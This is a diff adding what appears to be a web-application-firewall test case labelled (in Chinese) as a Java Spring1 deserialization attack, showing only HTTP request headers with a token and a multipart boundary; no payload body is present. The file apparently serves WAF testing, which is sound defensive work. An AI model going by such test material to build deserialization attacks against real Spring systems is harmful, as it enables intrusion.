@@ -1,0 +1,10 @@
+# 反序列化-JAVA Spring1
+# Spring是一个轻量级,开源的JavaEE框架. Spring可以解决企业应用开发的复杂性,可以更方便的去开发。
+POST /?acid=80001749&bid=hd_tag_m8mv25o1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25o1
+RM-PRO-Token: 7f6d0dd30dda1824e8b3364da42530a4
+RM-PRO-Time: 1742808490033
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=WsBAVZJ08x5C3HMvnp_grswwxB1aHz1h
+
